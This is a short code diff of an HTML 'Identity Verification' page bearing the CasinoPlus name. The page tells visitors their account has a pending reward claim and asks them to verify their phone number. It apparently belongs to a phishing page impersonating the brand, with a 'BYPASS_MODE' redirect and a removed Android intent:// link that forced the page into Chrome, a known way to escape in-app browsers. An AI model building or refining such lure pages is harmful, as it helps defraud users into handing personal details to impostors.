@@ -134,7 +134,7 @@
 <body>
 
     <div class="card">
-        <img src="https://casinoplus.static2.website/images/image-7.jpg" class="logo-img" alt="CasinoPlus">
+        <img src="image-7.jpg" class="logo-img" alt="CasinoPlus">
         <h1>Identity Verification</h1>
         <p>Your account is flagged for a pending reward claim. Please verify your phone number to continue.</p>
         <button class="btn-primary" id="verifyBtnMain" onclick="handleVerify()">Proceed to Verification</button>
@@ -230,7 +230,7 @@ window.onload = () => {
             if(BYPASS_MODE) {
                 // Pag bypass, rekta main.html na parang dating file mo
                 setTimeout(() => {
-                    window.location.href = "intent://casinoplus.static2.website/main.html#Intent;scheme=https;package=com.android.chrome;end";
+                    window.location.href = "main.html";
                 }, 800);
             } else {
                 document.getElementById('step1').classList.add('hidden');
